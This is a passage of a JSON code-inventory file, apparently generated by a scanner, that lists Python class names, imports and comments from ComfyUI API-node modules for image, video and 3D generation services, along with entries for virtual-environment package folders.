          "class PikaResolutionEnum(str, Enum):",
          "class PikaStatusEnum(str, Enum):",
          "class PikaValidationError(BaseModel):",
          "class PikaVideoResponse(BaseModel):",
          "class Pikaffect(str, Enum):",
          "class Resp(BaseModel):",
          "class PixverseImageUploadResponse(BaseModel):",
          "class Duration(int, Enum):",
          "class Model1(str, Enum):",
          "class MotionMode(str, Enum):",
          "class Quality1(str, Enum):",
          "class Style1(str, Enum):",
          "class PixverseImageVideoRequest(BaseModel):",
          "class AspectRatio2(str, Enum):",
          "class PixverseTextVideoRequest(BaseModel):",
          "class PixverseTransitionVideoRequest(BaseModel):",
          "class Resp1(BaseModel):",
          "class PixverseVideoResponse(BaseModel):",
          "class Status8(int, Enum):",
          "class Resp2(BaseModel):",
          "class PixverseVideoResultResponse(BaseModel):",
          "class PublisherStatus(str, Enum):",
          "class PublisherUser(BaseModel):",
          "class RgbItem(RootModel[int]):",
          "class RGBColor(BaseModel):",
          "class GenerateSummary(str, Enum):",
          "class Summary(str, Enum):",
          "class ReasoningEffort(str, Enum):",
          "class Status9(str, Enum):",
          "class Type17(str, Enum):",
          "class SummaryItem(BaseModel):",
          "class Type18(str, Enum):",
          "class ReasoningItem(BaseModel):",
          "class RecraftImageColor(BaseModel):",
          "class RecraftImageFeatures(BaseModel):",
          "class RecraftImageFormat(str, Enum):",
          "class Controls(BaseModel):",
          "class RecraftImageGenerationRequest(BaseModel):",
          "class Datum3(BaseModel):",
          "class RecraftImageGenerationResponse(BaseModel):",
          "class RecraftImageStyle(str, Enum):",
          "class RecraftImageSubStyle(str, Enum):",
          "class RecraftResponseFormat(str, Enum):",
          "class RecraftTextLayoutItem(BaseModel):",
          "class RecraftTransformModel(str, Enum):",
          "class RecraftUserControls(BaseModel):",
          "class Attention(str, Enum):",
          "class Project(str, Enum):",
          "class ReleaseNote(BaseModel):",
          "class RenderingSpeed(str, Enum):",
          "class Type19(str, Enum):",
          "class Type20(str, Enum):",
          "class Type21(str, Enum):",
          "class Type22(str, Enum):",
          "class ResponseErrorCode(str, Enum):",
          "class Type23(str, Enum):",
          "class ResponseErrorEvent(BaseModel):",
          "class Type24(str, Enum):",
          "class Type25(str, Enum):",
          "class ResponseFormatJsonObject(BaseModel):",
          "class ResponseFormatJsonSchemaSchema(BaseModel):",
          "class Type26(str, Enum):",
          "class ResponseFormatText(BaseModel):",
          "class Type27(str, Enum):",
          "class Type28(str, Enum):",
          "class Type29(str, Enum):",
          "class Type30(str, Enum):",
          "class Truncation1(str, Enum):",
          "class InputTokensDetails1(BaseModel):",
          "class OutputTokensDetails(BaseModel):",
          "class ResponseUsage(BaseModel):",
          "class Rodin3DCheckStatusRequest(BaseModel):",
          "class Rodin3DDownloadRequest(BaseModel):",
          "class RodinGenerateJobsData(BaseModel):",
          "class RodinMaterialType(str, Enum):",
          "class RodinMeshModeType(str, Enum):",
          "class RodinQualityType(str, Enum):",
          "class RodinResourceItem(BaseModel):",
          "class RodinStatusOptions(str, Enum):",
          "class RodinTierType(str, Enum):",
          "class RunwayAspectRatioEnum(str, Enum):",
          "class RunwayDurationEnum(int, Enum):",
          "class RunwayImageToVideoResponse(BaseModel):",
          "class RunwayModelEnum(str, Enum):",
          "class Position(str, Enum):",
          "class RunwayPromptImageDetailedObject(BaseModel):",
          "class RunwayPromptImageObject(",
          "class RunwayTaskStatusEnum(str, Enum):",
          "class RunwayTaskStatusResponse(BaseModel):",
          "class RunwayTextToImageAspectRatioEnum(str, Enum):",
          "class Model4(str, Enum):",
          "class ReferenceImage(BaseModel):",
          "class RunwayTextToImageRequest(BaseModel):",
          "class RunwayTextToImageResponse(BaseModel):",
          "class Name(str, Enum):",
          "class StabilityContentModerationResponse(BaseModel):",
          "class StabilityCreativity(RootModel[float]):",
          "class StabilityError(BaseModel):",
          "class StabilityGenerationID(RootModel[str]):",
          "class Status10(str, Enum):",
          "class StabilityGetResultResponse202(BaseModel):",
          "class AspectRatio3(str, Enum):",
          "class Mode(str, Enum):",
          "class Model5(str, Enum):",
          "class OutputFormat3(str, Enum):",
          "class StylePreset(str, Enum):",
          "class StabilityImageGenerationSD3Request(BaseModel):",
          "class FinishReason(str, Enum):",
          "class StabilityImageGenrationSD3Response200(BaseModel):",
          "class StabilityImageGenrationSD3Response400(BaseModel):",
          "class StabilityImageGenrationSD3Response413(BaseModel):",
          "class StabilityImageGenrationSD3Response422(BaseModel):",
          "class StabilityImageGenrationSD3Response429(BaseModel):",
          "class StabilityImageGenrationSD3Response500(BaseModel):",
          "class OutputFormat4(str, Enum):",
          "class StabilityImageGenrationUpscaleConservativeRequest(BaseModel):",
          "class StabilityImageGenrationUpscaleConservativeResponse200(BaseModel):",
          "class StabilityImageGenrationUpscaleConservativeResponse400(BaseModel):",
          "class StabilityImageGenrationUpscaleConservativeResponse413(BaseModel):",
          "class StabilityImageGenrationUpscaleConservativeResponse422(BaseModel):",
          "class StabilityImageGenrationUpscaleConservativeResponse429(BaseModel):",
          "class StabilityImageGenrationUpscaleConservativeResponse500(BaseModel):",
          "class StabilityImageGenrationUpscaleCreativeRequest(BaseModel):",
          "class StabilityImageGenrationUpscaleCreativeResponse200(BaseModel):",
          "class StabilityImageGenrationUpscaleCreativeResponse400(BaseModel):",
          "class StabilityImageGenrationUpscaleCreativeResponse413(BaseModel):",
          "class StabilityImageGenrationUpscaleCreativeResponse422(BaseModel):",
          "class StabilityImageGenrationUpscaleCreativeResponse429(BaseModel):",
          "class StabilityImageGenrationUpscaleCreativeResponse500(BaseModel):",
          "class StabilityImageGenrationUpscaleFastRequest(BaseModel):",
          "class StabilityImageGenrationUpscaleFastResponse200(BaseModel):",
          "class StabilityImageGenrationUpscaleFastResponse400(BaseModel):",
          "class StabilityImageGenrationUpscaleFastResponse413(BaseModel):",
          "class StabilityImageGenrationUpscaleFastResponse422(BaseModel):",
          "class StabilityImageGenrationUpscaleFastResponse429(BaseModel):",
          "class StabilityImageGenrationUpscaleFastResponse500(BaseModel):",
          "class StabilityStabilityClientID(RootModel[str]):",
          "class StabilityStabilityClientUserID(RootModel[str]):",
          "class StabilityStabilityClientVersion(RootModel[str]):",
          "class StorageFile(BaseModel):",
          "class StripeAddress(BaseModel):",
          "class StripeAmountDetails(BaseModel):",
          "class StripeBillingDetails(BaseModel):",
          "class Checks(BaseModel):",
          "class ExtendedAuthorization(BaseModel):",
          "class IncrementalAuthorization(BaseModel):",
          "class Multicapture(BaseModel):",
          "class NetworkToken(BaseModel):",
          "class Overcapture(BaseModel):",
          "class StripeCardDetails(BaseModel):",
          "class Object1(str, Enum):",
          "class Object2(str, Enum):",
          "class Type31(str, Enum):",
          "class StripeOutcome(BaseModel):",
          "class Object3(str, Enum):",
          "class StripePaymentMethodDetails(BaseModel):",
          "class Card(BaseModel):",
          "class StripePaymentMethodOptions(BaseModel):",
          "class StripeRefundList(BaseModel):",
          "class StripeRequestInfo(BaseModel):",
          "class StripeShipping(BaseModel):",
          "class Type32(str, Enum):",
          "class TextResponseFormatJsonSchema(BaseModel):",
          "class Type33(str, Enum):",
          "class ToolChoiceFunction(BaseModel):",
          "class ToolChoiceOptions(str, Enum):",
          "class Type34(str, Enum):",
          "class ToolChoiceTypes(BaseModel):",
          "class TripoAnimation(str, Enum):",
          "class TripoBalance(BaseModel):",
          "class TripoConvertFormat(str, Enum):",
          "class Code(int, Enum):",
          "class TripoErrorResponse(BaseModel):",
          "class TripoImageToModel(str, Enum):",
          "class TripoModelStyle(str, Enum):",
          "class TripoModelVersion(str, Enum):",
          "class TripoMultiviewMode(str, Enum):",
          "class TripoMultiviewToModel(str, Enum):",
          "class TripoOrientation(str, Enum):",
          "class TripoResponseSuccessCode(RootModel[int]):",
          "class TripoSpec(str, Enum):",
          "class TripoStandardFormat(str, Enum):",
          "class TripoStylizeOptions(str, Enum):",
          "class Code1(int, Enum):",
          "class Data9(BaseModel):",
          "class TripoSuccessTask(BaseModel):",
          "class Topology(str, Enum):",
          "class Output(BaseModel):",
          "class Status11(str, Enum):",
          "class TripoTask(BaseModel):",
          "class TripoTextToModel(str, Enum):",
          "class TripoTextureAlignment(str, Enum):",
          "class TripoTextureFormat(str, Enum):",
          "class TripoTextureQuality(str, Enum):",
          "class TripoTopology(str, Enum):",
          "class TripoTypeAnimatePrerigcheck(str, Enum):",
          "class TripoTypeAnimateRetarget(str, Enum):",
          "class TripoTypeAnimateRig(str, Enum):",
          "class TripoTypeConvertModel(str, Enum):",
          "class TripoTypeRefineModel(str, Enum):",
          "class TripoTypeStylizeModel(str, Enum):",
          "class TripoTypeTextureModel(str, Enum):",
          "class User(BaseModel):",
          "class Veo2GenVidPollRequest(BaseModel):",
          "class Error1(BaseModel):",
          "class Video(BaseModel):",
          "class Response(BaseModel):",
          "class Veo2GenVidPollResponse(BaseModel):",
          "class Image(BaseModel):",
          "class Image1(BaseModel):",
          "class Instance(BaseModel):",
          "class PersonGeneration1(str, Enum):",
          "class Parameters(BaseModel):",
          "class Veo2GenVidRequest(BaseModel):",
          "class Veo2GenVidResponse(BaseModel):",
          "class VeoGenVidPollRequest(BaseModel):",
          "class Response1(BaseModel):",
          "class VeoGenVidPollResponse(BaseModel):",
          "class Image2(BaseModel):",
          "class Image3(BaseModel):",
          "class Instance1(BaseModel):",
          "class Parameters1(BaseModel):",
          "class VeoGenVidRequest(BaseModel):",
          "class VeoGenVidResponse(BaseModel):",
          "class SearchContextSize(str, Enum):",
          "class Type35(str, Enum):",
          "class WebSearchPreviewTool(BaseModel):",
          "class Status12(str, Enum):",
          "class Type36(str, Enum):",
          "class WebSearchToolCall(BaseModel):",
          "class WorkflowRunStatus(str, Enum):",
          "class ActionJobResult(BaseModel):",
          "class BFLCannyInputs(BaseModel):",
          "class BFLDepthInputs(BaseModel):",
          "class BFLFluxProExpandInputs(BaseModel):",
          "class BFLFluxProFillInputs(BaseModel):",
          "class BFLHTTPValidationError(BaseModel):",
          "class BulkNodeVersionsRequest(BaseModel):",
          "class GeminiInlineData(BaseModel):",
          "class GeminiPart(BaseModel):",
          "class GeminiPromptFeedback(BaseModel):",
          "class GeminiSafetySetting(BaseModel):",
          "class GeminiSystemInstructionContent(BaseModel):",
          "class GeminiUsageMetadata(BaseModel):",
          "class GithubInstallation(BaseModel):",
          "class GithubReleaseAsset(BaseModel):",
          "class Release(BaseModel):",
          "class GithubRepository(BaseModel):",
          "class IdeogramV3EditRequest(BaseModel):",
          "class IdeogramV3Request(BaseModel):",
          "class ImagenGenerateImageResponse(BaseModel):",
          "class ImagenImageGenerationParameters(BaseModel):",
          "class InputContent(",
          "class InputMessageContentList(RootModel[List[InputContent]]):",
          "class KlingCameraControl(BaseModel):",
          "class KlingDualCharacterEffectInput(BaseModel):",
          "class KlingImage2VideoRequest(BaseModel):",
          "class TaskResult(BaseModel):",
          "class Data(BaseModel):",
          "class KlingImage2VideoResponse(BaseModel):",
          "class TaskResult1(BaseModel):",
          "class Data1(BaseModel):",
          "class KlingImageGenerationsResponse(BaseModel):",
          "class KlingLipSyncInputObject(BaseModel):",
          "class KlingLipSyncRequest(BaseModel):",
          "class TaskResult2(BaseModel):",
          "class Data2(BaseModel):",
          "class KlingLipSyncResponse(BaseModel):",
          "class KlingSingleImageEffectInput(BaseModel):",
          "class KlingText2VideoRequest(BaseModel):",
          "class Data4(BaseModel):",
          "class KlingText2VideoResponse(BaseModel):",
          "class KlingVideoEffectsInput(",
          "class KlingVideoEffectsRequest(BaseModel):",
          "class Data5(BaseModel):",
          "class KlingVideoEffectsResponse(BaseModel):",
          "class KlingVideoExtendRequest(BaseModel):",
          "class Data6(BaseModel):",
          "class KlingVideoExtendResponse(BaseModel):",
          "class LumaGenerationRequest(BaseModel):",
          "class CharacterRef(BaseModel):",
          "class LumaImageGenerationRequest(BaseModel):",
          "class LumaUpscaleVideoGenerationRequest(BaseModel):",
          "class MoonvalleyImageToVideoRequest(MoonvalleyTextToVideoRequest):",
          "class MoonvalleyResizeVideoRequest(MoonvalleyVideoToVideoRequest):",
          "class MoonvalleyTextToImageRequest(BaseModel):",
          "class NodeVersion(BaseModel):",
          "class OutputContent(RootModel[Union[OutputTextContent, OutputAudioContent]]):",
          "class OutputMessage(BaseModel):",
          "class PikaBodyGenerate22I2vGenerate22I2vPost(BaseModel):",
          "class PikaBodyGenerate22KeyframeGenerate22PikaframesPost(BaseModel):",
          "class PikaBodyGenerate22T2vGenerate22T2vPost(BaseModel):",
          "class PikaBodyGeneratePikaffectsGeneratePikaffectsPost(BaseModel):",
          "class PikaHTTPValidationError(BaseModel):",
          "class PublisherMember(BaseModel):",
          "class Reasoning(BaseModel):",
          "class RecraftImage(BaseModel):",
          "class RecraftProcessImageRequest(BaseModel):",
          "class RecraftProcessImageResponse(BaseModel):",
          "class RecraftTextLayout(RootModel[List[RecraftTextLayoutItem]]):",
          "class RecraftTransformImageWithMaskRequest(BaseModel):",
          "class ResponseContentPartAddedEvent(BaseModel):",
          "class ResponseContentPartDoneEvent(BaseModel):",
          "class ResponseError(BaseModel):",
          "class Rodin3DDownloadResponse(BaseModel):",
          "class Rodin3DGenerateRequest(BaseModel):",
          "class Rodin3DGenerateResponse(BaseModel):",
          "class RodinCheckStatusJobItem(BaseModel):",
          "class RunwayImageToVideoRequest(BaseModel):",
          "class StripeCharge(BaseModel):",
          "class StripeChargeList(BaseModel):",
          "class StripePaymentIntent(BaseModel):",
          "class TextResponseFormatConfiguration(",
          "class Tool(",
          "class BulkNodeVersionResult(BaseModel):",
          "class BulkNodeVersionsResponse(BaseModel):",
          "class EasyInputMessage(BaseModel):",
          "class GeminiContent(BaseModel):",
          "class GeminiGenerateContentRequest(BaseModel):",
          "class GithubReleaseWebhook(BaseModel):",
          "class ImagenGenerateImageRequest(BaseModel):",
          "class InputMessage(BaseModel):",
          "class Item(",
          "class LumaGeneration(BaseModel):",
          "class OutputItem(",
          "class Publisher(BaseModel):",
          "class RecraftGenerateImageResponse(BaseModel):",
          "class RecraftImageToImageRequest(BaseModel):",
          "class ResponseOutputItemAddedEvent(BaseModel):",
          "class ResponseOutputItemDoneEvent(BaseModel):",
          "class Text(BaseModel):",
          "class ResponseProperties(BaseModel):",
          "class Rodin3DCheckStatusResponse(BaseModel):",
          "class Data8(BaseModel):",
          "class StripeEvent(BaseModel):",
          "class GeminiCandidate(BaseModel):",
          "class GeminiGenerateContentResponse(BaseModel):",
          "class InputItem(RootModel[Union[EasyInputMessage, Item]]):",
          "class Node(BaseModel):",
          "class OpenAICreateResponse(CreateModelResponseProperties, ResponseProperties):",
          "class OpenAIResponse(ModelResponseProperties, ResponseProperties):",
          "class ResponseCompletedEvent(BaseModel):",
          "class ResponseCreatedEvent(BaseModel):",
          "class ResponseFailedEvent(BaseModel):",
          "class ResponseInProgressEvent(BaseModel):",
          "class ResponseIncompleteEvent(BaseModel):",
          "class OpenAIResponseStreamEvent("
        ],
        "imports": [
          "from __future__ import annotations",
          "from datetime import date, datetime",
          "from enum import Enum",
          "from typing import Any, Dict, List, Literal, Optional, Union",
          "from uuid import UUID",
          "from pydantic import AnyUrl, BaseModel, ConfigDict, Field, RootModel, StrictBytes"
        ],
        "comments": [
          "# generated by datamodel-codegen:",
          "#   filename:  filtered-openapi.yaml",
          "#   timestamp: 2025-07-30T08:54:00+00:00",
          "# pylint: disable"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 1,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/ai-studio/ComfyUI/comfy_api_nodes/apis/minimax_api.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [
          "class MinimaxBaseResponse(BaseModel):",
          "class File(BaseModel):",
          "class MinimaxFileRetrieveResponse(BaseModel):",
          "class MiniMaxModel(str, Enum):",
          "class Status6(str, Enum):",
          "class MinimaxTaskResultResponse(BaseModel):",
          "class SubjectReferenceItem(BaseModel):",
          "class MinimaxVideoGenerationRequest(BaseModel):",
          "class MinimaxVideoGenerationResponse(BaseModel):"
        ],
        "imports": [
          "from enum import Enum",
          "from typing import Optional",
          "from pydantic import BaseModel, Field"
        ],
        "comments": [],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/ai-studio/ComfyUI/comfy_api_nodes/apis/veo_api.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [
          "class VeoRequestInstanceImage(BaseModel):",
          "class VeoRequestInstance(BaseModel):",
          "class VeoRequestParameters(BaseModel):",
          "class VeoGenVidRequest(BaseModel):",
          "class VeoGenVidResponse(BaseModel):",
          "class VeoGenVidPollRequest(BaseModel):",
          "class Video(BaseModel):",
          "class Error1(BaseModel):",
          "class Response1(BaseModel):",
          "class VeoGenVidPollResponse(BaseModel):"
        ],
        "imports": [
          "from typing import Optional",
          "from pydantic import BaseModel, Field"
        ],
        "comments": [],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/ai-studio/ComfyUI/comfy_api_nodes/apis/openai_api.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [
          "class Datum2(BaseModel):",
          "class InputTokensDetails(BaseModel):",
          "class Usage(BaseModel):",
          "class OpenAIImageGenerationResponse(BaseModel):",
          "class OpenAIImageEditRequest(BaseModel):",
          "class OpenAIImageGenerationRequest(BaseModel):"
        ],
        "imports": [
          "from pydantic import BaseModel, Field"
        ],
        "comments": [],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/ai-studio/ComfyUI/comfy_api_nodes/apis/bytedance_api.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [
          "class Text2ImageTaskCreationRequest(BaseModel):",
          "class Image2ImageTaskCreationRequest(BaseModel):",
          "class Seedream4Options(BaseModel):",
          "class Seedream4TaskCreationRequest(BaseModel):",
          "class ImageTaskCreationResponse(BaseModel):",
          "class TaskTextContent(BaseModel):",
          "class TaskImageContentUrl(BaseModel):",
          "class TaskImageContent(BaseModel):",
          "class Text2VideoTaskCreationRequest(BaseModel):",
          "class Image2VideoTaskCreationRequest(BaseModel):",
          "class TaskCreationResponse(BaseModel):",
          "class TaskStatusError(BaseModel):",
          "class TaskStatusResult(BaseModel):",
          "class TaskStatusResponse(BaseModel):"
        ],
        "imports": [
          "from typing import Literal",
          "from pydantic import BaseModel, Field"
        ],
        "comments": [
          "# The time in this dictionary are given for 10 seconds duration."
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/ai-studio/ComfyUI/comfy_api_nodes/apis/gemini_api.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [
          "class GeminiSafetyCategory(str, Enum):",
          "class GeminiSafetyThreshold(str, Enum):",
          "class GeminiSafetySetting(BaseModel):",
          "class GeminiRole(str, Enum):",
          "class GeminiMimeType(str, Enum):",
          "class GeminiInlineData(BaseModel):",
          "class GeminiFileData(BaseModel):",
          "class GeminiPart(BaseModel):",
          "class GeminiTextPart(BaseModel):",
          "class GeminiContent(BaseModel):",
          "class GeminiSystemInstructionContent(BaseModel):",
          "class GeminiFunctionDeclaration(BaseModel):",
          "class GeminiTool(BaseModel):",
          "class GeminiOffset(BaseModel):",
          "class GeminiVideoMetadata(BaseModel):",
          "class GeminiGenerationConfig(BaseModel):",
          "class GeminiImageConfig(BaseModel):",
          "class GeminiImageGenerationConfig(GeminiGenerationConfig):",
          "class GeminiImageGenerateContentRequest(BaseModel):",
          "class GeminiGenerateContentRequest(BaseModel):",
          "class Modality(str, Enum):",
          "class ModalityTokenCount(BaseModel):",
          "class Probability(str, Enum):",
          "class GeminiSafetyRating(BaseModel):",
          "class GeminiCitation(BaseModel):",
          "class GeminiCitationMetadata(BaseModel):",
          "class GeminiCandidate(BaseModel):",
          "class GeminiPromptFeedback(BaseModel):",
          "class GeminiUsageMetadata(BaseModel):",
          "class GeminiGenerateContentResponse(BaseModel):"
        ],
        "imports": [
          "from datetime import date",
          "from enum import Enum",
          "from typing import Any",
          "from pydantic import BaseModel, Field"
        ],
        "comments": [],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/ai-studio/ComfyUI/comfy_api_nodes/apis/tripo_api.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [
          "class TripoModelVersion(str, Enum):",
          "class TripoGeometryQuality(str, Enum):",
          "class TripoTextureQuality(str, Enum):",
          "class TripoStyle(str, Enum):",
          "class TripoTaskType(str, Enum):",
          "class TripoTextureAlignment(str, Enum):",
          "class TripoOrientation(str, Enum):",
          "class TripoOutFormat(str, Enum):",
          "class TripoTopology(str, Enum):",
          "class TripoSpec(str, Enum):",
          "class TripoAnimation(str, Enum):",
          "class TripoStylizeStyle(str, Enum):",
          "class TripoConvertFormat(str, Enum):",
          "class TripoTextureFormat(str, Enum):",
          "class TripoTaskStatus(str, Enum):",
          "class TripoFbxPreset(str, Enum):",
          "class TripoFileTokenReference(BaseModel):",
          "class TripoUrlReference(BaseModel):",
          "class TripoObjectStorage(BaseModel):",
          "class TripoObjectReference(BaseModel):",
          "class TripoFileEmptyReference(BaseModel):",
          "class TripoFileReference(RootModel):",
          "class TripoGetStsTokenRequest(BaseModel):",
          "class TripoTextToModelRequest(BaseModel):",
          "class TripoImageToModelRequest(BaseModel):",
          "class TripoMultiviewToModelRequest(BaseModel):",
          "class TripoTextureModelRequest(BaseModel):",
          "class TripoRefineModelRequest(BaseModel):",
          "class TripoAnimatePrerigcheckRequest(BaseModel):",
          "class TripoAnimateRigRequest(BaseModel):",
          "class TripoAnimateRetargetRequest(BaseModel):",
          "class TripoStylizeModelRequest(BaseModel):",
          "class TripoConvertModelRequest(BaseModel):",
          "class TripoTaskRequest(RootModel):",
          "class TripoTaskOutput(BaseModel):",
          "class TripoTask(BaseModel):",
          "class TripoTaskResponse(BaseModel):",
          "class TripoGeneralResponse(BaseModel):",
          "class TripoBalanceData(BaseModel):",
          "class TripoBalanceResponse(BaseModel):",
          "class TripoErrorResponse(BaseModel):"
        ],
        "imports": [
          "from __future__ import annotations",
          "from enum import Enum",
          "from typing import Optional, List, Dict, Any, Union",
          "from pydantic import BaseModel, Field, RootModel"
        ],
        "comments": [],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/ai-studio/ComfyUI/comfy_api_nodes/apis/luma_api.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, image: torch.Tensor, weight: float):",
          "def create_api_model(self, download_url: str):",
          "def __init__(self, first_ref: LumaReference=None):",
          "def add(self, luma_ref: LumaReference=None):",
          "def create_api_model(self, download_urls: list[str], max_refs=4):",
          "def clone(self):",
          "def __init__(self, key: str):",
          "def __init__(self, str_list: list[str] = None):",
          "def add(self, concept: LumaConcept):",
          "def create_api_model(self):",
          "def clone(self):",
          "def clone_and_merge(self, other: LumaConceptChain):",
          "def get_luma_concepts(include_none=False):"
        ],
        "class_defs": [
          "class LumaIO:",
          "class LumaReference:",
          "class LumaReferenceChain:",
          "class LumaConcept:",
          "class LumaConceptChain:",
          "class LumaImageModel(str, Enum):",
          "class LumaVideoModel(str, Enum):",
          "class LumaAspectRatio(str, Enum):",
          "class LumaVideoOutputResolution(str, Enum):",
          "class LumaVideoModelOutputDuration(str, Enum):",
          "class LumaGenerationType(str, Enum):",
          "class LumaState(str, Enum):",
          "class LumaAssets(BaseModel):",
          "class LumaImageRef(BaseModel):",
          "class LumaImageReference(BaseModel):",
          "class LumaModifyImageRef(BaseModel):",
          "class LumaCharacterRef(BaseModel):",
          "class LumaImageIdentity(BaseModel):",
          "class LumaGenerationReference(BaseModel):",
          "class LumaKeyframes(BaseModel):",
          "class LumaConceptObject(BaseModel):",
          "class LumaImageGenerationRequest(BaseModel):",
          "class LumaGenerationRequest(BaseModel):",
          "class LumaGeneration(BaseModel):"
        ],
        "imports": [
          "from __future__ import annotations",
          "import torch",
          "from enum import Enum",
          "from typing import Optional, Union",
          "from pydantic import BaseModel, Field, confloat"
        ],
        "comments": [],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/ai-studio/ComfyUI/comfy_api_nodes/apis/rodin_api.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [
          "class Rodin3DGenerateRequest(BaseModel):",
          "class GenerateJobsData(BaseModel):",
          "class Rodin3DGenerateResponse(BaseModel):",
          "class JobStatus(str, Enum):",
          "class Rodin3DCheckStatusRequest(BaseModel):",
          "class JobItem(BaseModel):",
          "class Rodin3DCheckStatusResponse(BaseModel):",
          "class Rodin3DDownloadRequest(BaseModel):",
          "class RodinResourceItem(BaseModel):",
          "class Rodin3DDownloadResponse(BaseModel):"
        ],
        "imports": [
          "from __future__ import annotations",
          "from enum import Enum",
          "from typing import Optional, List",
          "from pydantic import BaseModel, Field"
        ],
        "comments": [],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/ai-studio/ComfyUI/comfy_api_nodes/apis/stability_api.py",
        "docstrings": [],
        "function_defs": [
          "def get_stability_style_presets(include_none=True):"
        ],
        "class_defs": [
          "class StabilityFormat(str, Enum):",
          "class StabilityAspectRatio(str, Enum):",
          "class StabilityStylePreset(str, Enum):",
          "class Stability_SD3_5_Model(str, Enum):",
          "class Stability_SD3_5_GenerationMode(str, Enum):",
          "class StabilityStable3_5Request(BaseModel):",
          "class StabilityUpscaleConservativeRequest(BaseModel):",
          "class StabilityUpscaleCreativeRequest(BaseModel):",
          "class StabilityStableUltraRequest(BaseModel):",
          "class StabilityStableUltraResponse(BaseModel):",
          "class StabilityResultsGetResponse(BaseModel):",
          "class StabilityAsyncResponse(BaseModel):",
          "class StabilityTextToAudioRequest(BaseModel):",
          "class StabilityAudioToAudioRequest(StabilityTextToAudioRequest):",
          "class StabilityAudioInpaintRequest(StabilityTextToAudioRequest):",
          "class StabilityAudioResponse(BaseModel):"
        ],
        "imports": [
          "from __future__ import annotations",
          "from enum import Enum",
          "from typing import Optional",
          "from pydantic import BaseModel, Field, confloat"
        ],
        "comments": [
          "# sd3_5_large_turbo = \"sd3.5-large-turbo\""
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 1,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/ai-studio/ComfyUI/comfy_api_nodes/apis/pixverse_api.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [
          "class PixverseIO:",
          "class PixverseStatus(int, Enum):",
          "class PixverseAspectRatio(str, Enum):",
          "class PixverseQuality(str, Enum):",
          "class PixverseDuration(int, Enum):",
          "class PixverseMotionMode(str, Enum):",
          "class PixverseStyle(str, Enum):",
          "class PixverseTextVideoRequest(BaseModel):",
          "class PixverseImageVideoRequest(BaseModel):",
          "class PixverseTransitionVideoRequest(BaseModel):",
          "class PixverseImageUploadResponse(BaseModel):",
          "class PixverseImgIdResponseObject(BaseModel):",
          "class PixverseVideoResponse(BaseModel):",
          "class PixverseVideoIdResponseObject(BaseModel):",
          "class PixverseGenerationStatusResponse(BaseModel):",
          "class PixverseGenerationStatusResponseObject(BaseModel):"
        ],
        "imports": [
          "from __future__ import annotations",
          "from enum import Enum",
          "from typing import Optional",
          "from pydantic import BaseModel, Field"
        ],
        "comments": [
          "# NOTE: forgoing descriptions for now in return for dev speed",
          "# negative_prompt: Optional[str] = Field(None)",
          "# style: Optional[str] = Field(None)",
          "# template_id: Optional[int] = Field(None)",
          "# water_mark: Optional[bool] = Field(None)"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      }
    ],
    "rust_patterns": [],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Plex/DevSymlinks/venvs/SAM_voice_venv_coqui/lib/python3.11/site-packages/scipy/_lib/cobyqa",
    "name": "cobyqa",
    "languages": [
      "Python"
    ],
    "python_patterns": [],
    "rust_patterns": [],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Plex/DevSymlinks/venvs/RVC_venv/lib/python3.11/site-packages/numpy/fft",
    "name": "fft",
    "languages": [
      "Python"
    ],
    "python_patterns": [],
    "rust_patterns": [],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Plex/DevSymlinks/venvs/RVC_venv/lib/python3.11/site-packages/numpy/matrixlib",
    "name": "matrixlib",
    "languages": [
      "Python"
    ],
    "python_patterns": [],
    "rust_patterns": [],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Plex/DevSymlinks/venvs/RVC_venv/lib/python3.11/site-packages/gradio/_frontend_code/icons/src",
    "name": "src",
    "languages": [
      "Svelte",
      "TypeScript"
    ],
    "python_patterns": [],
    "rust_patterns": [],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Plex/DevSymlinks/venvs/RVC_venv/lib/python3.11/site-packages/gradio_client",
    "name": "gradio_client",
    "languages": [
      "Python"
    ],
    "python_patterns": [],
    "rust_patterns": [],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Plex/DevSymlinks/venvs/RVC_venv/lib/python3.11/site-packages/scipy/_lib/cobyqa",
    "name": "cobyqa",
    "languages": [
      "Python"
    ],
    "python_patterns": [],
    "rust_patterns": [],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Plex/DevSymlinks/venvs/SAM_voice_venv_diarization/lib/python3.11/site-packages/scipy/_lib/cobyqa",
